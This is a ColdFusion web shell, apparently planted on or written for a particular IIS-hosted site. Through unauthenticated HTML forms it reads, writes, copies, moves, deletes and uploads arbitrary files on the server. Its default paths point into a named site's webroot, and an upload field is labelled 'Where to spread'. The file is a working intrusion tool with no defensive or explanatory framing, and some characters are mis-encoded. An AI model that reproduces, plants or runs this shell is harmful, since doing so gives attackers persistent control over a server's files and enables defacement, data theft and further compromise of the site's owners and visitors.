<CFPARAM NAME="Form.Action" DEFAULT="ShowPost">
<CFSWITCH EXPRESSION=#Form.Action#>

<CFCASE VALUE="read">
<CFFILE ACTION="Read" FILE="#Form.path#" VARIABLE="Message">
<CFOUTPUT>#htmlCodeFormat(Message)#</CFOUTPUT>
</CFCASE>

<CFCASE VALUE="write">
<CFFILE ACTION="Write" FILE="#Form.path#" OUTPUT="#Form.cmd#">
success
</CFCASE>

<CFCASE VALUE="copy">
<CFFILE ACTION="Copy" SOURCE="#Form.source#" DESTINATION="#Form.DESTINATION#">
copy success
</CFCASE>

<CFCASE VALUE="move">
<CFFILE ACTION="MOVE" SOURCE="#Form.source#" DESTINATION="#Form.DESTINATION#">
move success
</CFCASE>

<CFCASE VALUE="delete">
<CFFILE ACTION="Delete" FILE="#Form.path#">
delete success
</CFCASE>


<CFCASE VALUE="upload">
<CFFILE ACTION="UPLOAD" FILEFIELD="FileContents" DESTINATION="#Form.path#" NAMECONFLICT="OVERWRITE">

upload success
</CFCASE>

<CFDEFAULTCASE>

<form action="" target="_blank" method=post>
<textarea style="width:600;height:200" name="cmd"></textarea><br>
<input name="path" value="D:\INETPUB\DRS.COM\WWWROOT\images\abc.htm" size=72>
<input type=submit value="write">
<input type=hidden name="action" value="write">
</form>
<br>

<form action="" target="_blank" method=post>
<input name="path" value="D:\INETPUB\DRS.COM\WWWROOT\index.cfm" size=72>
<input type=submit value="Show file contents">
<input type=hidden name="action" value="read">
</form>
<br>

<FORM ACTION="" ENCTYPE="multipart/form-data" METHOD="Post" target="_blank">
Where to spread: <INPUT NAME="path" value="D:\INETPUB\DRS.COM\WWWROOT\images\abc.htm" size=72><br>
local files: <INPUT NAME="FileContents" TYPE="file" size=50>
<input type=hidden name="action" value="upload">
<INPUT TYPE="submit" VALUE="upload">
</FORM>

<br>

<form action="" target="_blank" method=post>
Source File£º<input name="source" value="D:\INETPUB\DRS.COM\WWWROOT\images\source.htm" size=65><br>
copy to£º<input name="DESTINATION" value="D:\INETPUB\DRS.COM\WWWROOT\images\DESTINATION.htm" size=65>
<input type=submit value="copy files">
<input type=hidden name="action" value="copy">
</form>

<br>

<form action="" target="_blank" method=post>
Source File£º<input name="source" value="D:\INETPUB\DRS.COM\WWWROOT\images\source.htm" size=65><br>
move to£º<input name="DESTINATION" value="D:\INETPUB\DRS.COM\WWWROOT\images\DESTINATION.htm" size=65>
<input type=submit value="move to">
<input type=hidden name="action" value="move">
</form>

<br>

<form action="" target="_blank" method=post>
<input name="path" value="D:\INETPUB\DRS.COM\WWWROOT\images\abc.htm" size=72>
<input type=submit value="Delete specified file">
<input type=hidden name="action" value="delete">
</form>

</CFDEFAULTCASE>

</CFSWITCH>
